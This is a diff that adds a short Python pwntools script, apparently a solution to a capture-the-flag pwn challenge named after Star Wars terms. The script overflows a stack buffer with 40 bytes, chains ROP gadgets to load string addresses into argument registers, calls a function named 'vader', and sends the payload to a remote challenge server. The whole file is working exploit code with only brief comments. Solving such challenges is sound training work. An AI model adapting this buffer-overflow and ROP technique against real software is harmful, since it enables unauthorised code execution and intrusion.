@@ -1,0 +1,29 @@
+#!/usr/bin/env python3
+from pwn import *
+
+offset =        b'A'*40         # OVERFLOWING 32 + 8 BYTES FOR $RBP
+
+rdi =           p64(0x0040165b) # RDI, RSI, RDX, RCX, & R8 ARE ARGS REGISTERS
+rsi_r15 =       p64(0x00401659)
+rdx =           p64(0x004011ce)
+rcx_r8 =        p64(0x004011d8)
+
+dark =          p64(0x00402ec9) # ADDRESSES FOR STRINGS IN THE BINARY
+side =          p64(0x00402ece)
+r15_garbage =   p64(0xCAFEBEEF) # GARBAGE
+of =            p64(0x00402ed3)
+the =           p64(0x00402ed6)
+force =         p64(0x00402eda)
+
+vader =         p64(0x0040146b)
+
+payload = offset
+payload += rdi + dark                   # POP RDI, STORING "DARK"
+payload += rsi_r15 + side + r15_garbage # POP RSI & R15, STORE "S1D3" + GARBAGE
+payload += rdx + of                     # POP RDX, STORING "OF"
+payload += rcx_r8 + the + force         # POP RCX & R8, STORING "TH3" + "FORC3"
+payload += vader                        # ADDRESS OF VADER
+
+p = remote("0.cloud.chals.io", 20712)
+p.sendline(payload)
+log.success(p.recvallS())
